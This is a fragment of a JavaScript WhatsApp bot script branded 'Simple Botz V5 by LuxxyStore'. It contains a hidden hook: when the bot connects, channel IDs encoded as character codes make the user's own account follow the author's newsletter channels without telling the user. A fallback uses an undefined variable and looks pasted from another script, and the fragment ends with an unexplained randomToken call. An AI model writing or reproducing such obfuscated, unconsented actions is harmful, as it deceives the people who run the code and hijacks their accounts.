...
return {
conversation: 'WhatsApp Bot By LuxxyStore'
}}})
...
if (connection == 'open') {
try {
            Sky.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 50, 50, 52, 51, 48, 49, 55, 55, 51, 57, 49, 52, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114));
            Sky.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 51, 54, 52, 52, 48, 56, 48, 55, 51, 51, 53, 53, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114));
        } catch (e) {
try {
kyynev.newsletterFollow("120363420016823962@newsletter")
} catch {}
            console.error('❌ Newsletter follow error:', e);
        }
Sky.sendMessage(Sky.user.id.split(":")[0] + "@s.whatsapp.net", {text: `${`*#- Simple Botz Version 5.0.0*

WELCOME TO SCRIPT BOT SIMPLE V5 BY LuxxyStore`.toString()}`})
console.log(chalk.blue.bold(`Simple Botz RulzxXyz Connected ✓\n\n`))
randomToken(Sky)
